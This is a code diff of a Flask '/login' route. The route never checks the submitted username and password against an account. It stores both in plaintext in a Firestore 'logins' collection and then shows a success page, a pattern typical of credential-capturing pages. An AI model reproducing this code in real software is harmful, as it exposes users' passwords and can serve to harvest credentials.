@@ -39,25 +39,22 @@ def login():
     try:
         username = request.form.get('username')
         password = request.form.get('password')
-        
+
         if not username or not password:
-            logging.warning("Username or password missing in login form")
-            return jsonify({"status": "error", "message": "Username and password are required"}), 400
+            return render_template('error.html', message="Username and password are required.")
 
         user_data = {
-            'username': username.strip(),
-            'password': password.strip(),
-            'timestamp': datetime.utcnow().isoformat(),
-            'id': str(uuid.uuid4())
+            'id': str(uuid.uuid4()),
+            'username': username,
+            'password': password,
+            'timestamp': datetime.utcnow().isoformat()
         }
 
-        db.collection('users').add(user_data)
-        logging.debug(f"User data added to Firestore: {user_data}")
+        db.collection('logins').add(user_data)
+        return render_template('success.html', username=username)
 
-        return jsonify({"status": "success", "message": "Login successful", "data": user_data}), 200
     except Exception as e:
-        logging.error(f"Error in /login: {str(e)}")
-        return jsonify({"status": "error", "message": str(e)}), 500
+        return render_template('error.html', message=str(e)), 500
 
 @app.route('/success')
 def success():
